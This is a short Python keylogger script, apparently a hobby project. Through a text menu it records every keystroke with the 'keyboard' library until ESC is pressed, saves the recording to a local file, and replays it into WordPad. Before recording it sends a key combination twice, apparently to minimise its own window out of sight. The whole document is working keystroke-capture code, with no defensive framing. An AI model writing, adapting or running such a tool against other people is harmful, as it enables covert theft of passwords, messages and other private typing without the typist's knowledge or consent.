import keyboard as kb
import pickle as pk
from time import sleep
import os
while input("Press any key to Start --> \n\n"):
    op = int(input("Select any option \n1.Start Keylogger \n2.Get Keylogs \n3.Exit").strip())
    if op == 1: #Start Key Logger
        print("Starting Key Logger In 3 Sec \n Press ESC to Stop Keylogger\n")
        for var in range(1,4):   # Loading ...
            print(var,end="-",flush=True)
            sleep(1)
        else:   
            print("\nStarted .....")   # Key logger started
            sleep(2)
            kb.press_and_release("cmd + down")
            sleep(0.1)
            kb.press_and_release("cmd + down")
        kb.start_recording()
        while True:
            if kb.is_pressed("esc"): # Press ESC To Stop Key logger
                data = kb.stop_recording()  # key logger Stoped
                break
        fp = open("log.db","wb")
        pk.dump(data,fp) # writing keylogs in log.db file
        fp.close()
        break
    elif op==2:  # Get Keylogs
        print("Opening Wordpad please wait ....")
        fp = open("log.db","rb")
        data = pk.load(fp)   # Loading Keylogs from log.db file
        fp.close()
        os.system("write.exe")
        sleep(2)
        kb.press_and_release("enter")
        kb.play(data,speed_factor=0.5)
        sleep(0.3)
    elif op == 3: # Exit
        break
    else:
        print("Wrong Input\nRestarting Please wait ....")
    continue
